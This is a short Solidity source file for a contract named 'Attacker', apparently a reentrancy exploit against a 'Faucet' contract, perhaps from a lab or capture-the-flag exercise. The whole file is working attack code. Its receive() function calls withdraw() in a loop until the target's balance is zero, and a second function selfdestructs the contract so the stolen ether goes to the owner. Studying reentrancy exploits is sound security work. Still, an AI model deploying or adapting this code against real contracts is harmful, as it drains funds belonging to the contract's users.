// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    modifier onlyOwner() {
        require(owner == msg.sender, "Only owner allowed");
        _;
    }

    Faucet public target;
    address private owner;
    uint256 private userBlockNumber;

    constructor(address _target) {
        owner = msg.sender;
        target = Faucet(_target);
        userBlockNumber = block.number;
        target.register(address(this));
    }

    receive() external payable {
        while (address(target).balance != 0) target.withdraw();
    }

    function attack() external {
        require(userBlockNumber < block.number, "Call me later, bro");
        target.withdraw();
    }

    function attackTwo() external onlyOwner {
        selfdestruct(payable(owner));
    }
}